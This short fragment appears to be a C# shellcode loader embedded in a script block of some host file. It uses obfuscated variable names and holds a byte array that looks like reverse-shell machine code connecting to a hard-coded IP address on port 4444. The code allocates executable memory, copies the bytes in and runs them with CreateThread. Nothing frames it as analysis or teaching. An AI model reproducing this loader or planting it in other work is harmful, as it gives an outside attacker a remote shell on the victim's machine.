...
0x68,0x52,0x92,0x28,0xf5,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr oMN = VirtualAlloc(IntPtr.Zero,(UIntPtr)ylLGNxj6YO.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(ylLGNxj6YO,0,oMN,ylLGNxj6YO.Length);
        IntPtr r57f9lLBRo = IntPtr.Zero;
        IntPtr rNEL5ha = CreateThread(IntPtr.Zero,UIntPtr.Zero,oMN,IntPtr.Zero,0,ref r57f9lLBRo);
    }
</script>
